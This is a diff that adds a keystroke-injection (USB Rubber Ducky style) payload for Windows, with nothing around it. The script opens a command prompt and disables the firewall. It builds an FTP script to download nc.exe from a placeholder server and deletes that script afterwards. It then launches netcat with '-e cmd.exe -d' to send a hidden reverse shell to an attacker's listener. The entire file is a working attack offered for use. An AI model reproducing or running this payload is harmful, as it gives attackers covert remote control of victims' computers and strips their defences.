@@ -1,0 +1,47 @@
+DELAY 10000
+GUI r
+DELAY 200
+STRING cmd
+ENTER
+DELAY 600
+STRING cd %USERPROFILE%
+ENTER
+DELAY 100
+STRING netsh firewall set opmode disable
+ENTER
+DELAY 2000
+STRING echo open [IP] [PORT] > ftp.txt
+ENTER
+DELAY 100
+STRING echo [USERNAME]>> ftp.txt
+ENTER
+DELAY 100
+STRING echo [PASSWORD]>> ftp.txt
+ENTER
+DELAY 100
+STRING echo bin >> ftp.txt
+ENTER
+DELAY 100
+STRING echo get nc.exe >> ftp.txt
+ENTER
+DELAY 100
+STRING echo bye >> ftp.txt
+ENTER
+DELAY 100
+STRING ftp -s:ftp.txt
+ENTER
+STRING del ftp.txt & exit
+ENTER
+DELAY 2000
+GUI r
+DELAY 200
+STRING nc.exe [LISTENER IP] [LISTENER PORT] -e cmd.exe -d
+ENTER
+DELAY 2000
+GUI r
+DELAY 200
+STRING cmd
+ENTER
+DELAY 600
+STRING exit
+ENTER
